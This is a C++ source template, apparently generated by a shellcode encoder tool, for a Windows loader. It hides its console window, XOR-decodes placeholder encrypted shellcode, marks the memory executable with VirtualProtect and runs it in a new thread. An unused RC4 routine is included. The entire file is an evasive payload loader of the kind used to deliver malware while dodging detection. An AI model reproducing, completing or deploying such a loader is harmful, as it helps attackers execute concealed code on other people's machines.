#include <windows.h>
#include <iostream>
#pragma comment(linker,"/subsystem:\"windows\" /entry:\"mainCRTStartup\"")//不显示窗口

char* RC4(char* C, char* key)
{
    int S[256];
    int T[256];

    int  count = 0;
    count = strlen(key);

    for (int i = 0; i < 256; i++)
    {
        S[i] = i;
        int tmp = i % count;
        T[i] = key[tmp];
    }

    int j = 0;

    for (int i = 0; i < 256; i++)
    {
        j = (j + S[i] + T[i]) % 256;
        int tmp;
        tmp = S[j];
        S[j] = S[i];
        S[i] = tmp;
    }

    int length = 0;
    length = strlen(C);

    int i;
    i = 0, j = 0;

    for (int p = 0; p < length; p++)
    {

        i = (i + 1) % 256;
        j = (j + S[i]) % 256;
        int tmp;
        tmp = S[j];
        S[j] = S[i];
        S[i] = tmp;

        int k = S[(S[i] + S[j]) % 256];
        C[p] = C[p] ^ k;
    }

    return C;
}

int main(int argc, char **argv) {

	// Encrypted shellcode and cipher key obtained from shellcode_encoder.py
	int shellcode_size = 0;
	DWORD dwThreadId; // 线程ID
    HANDLE hThread; // 线程句柄
    DWORD dwOldProtect; // 内存页属性
	char encryptedShellcode[] = "${shellcode}";
	char key[] = "${key}";
	char cipherType[] = "${cipherType}";
	shellcode_size = sizeof(encryptedShellcode);
	// Char array to host the deciphered shellcode
	char shellcode[sizeof(encryptedShellcode)];	
	if (strcmp(cipherType, "xor") == 0)
	{
	// XOR decoding stub using the key defined above must be the same as the encoding key
		int j = 0;
		for (int i = 0; i < sizeof encryptedShellcode; i++) {
			if (j == sizeof key - 1) j = 0;
			shellcode[i] = encryptedShellcode[i] ^ key[j];
			j++;
		}
	}
	char* shellcode1 = (char*)VirtualAlloc(
			NULL,
			shellcode_size,
			MEM_COMMIT,
			PAGE_READWRITE // 只申请可读可写
		);
	CopyMemory(shellcode1, shellcode, shellcode_size);
	VirtualProtect(shellcode1, shellcode_size, PAGE_EXECUTE, &dwOldProtect);
	hThread = CreateThread(
        NULL, // 安全描述符
        NULL, // 栈的大小
        (LPTHREAD_START_ROUTINE)shellcode1, // 函数
        NULL, // 参数
        NULL, // 线程标志
        &dwThreadId // 线程ID
    );

    WaitForSingleObject(hThread, INFINITE); // 一直等待线程执行结束
	return 0;
}
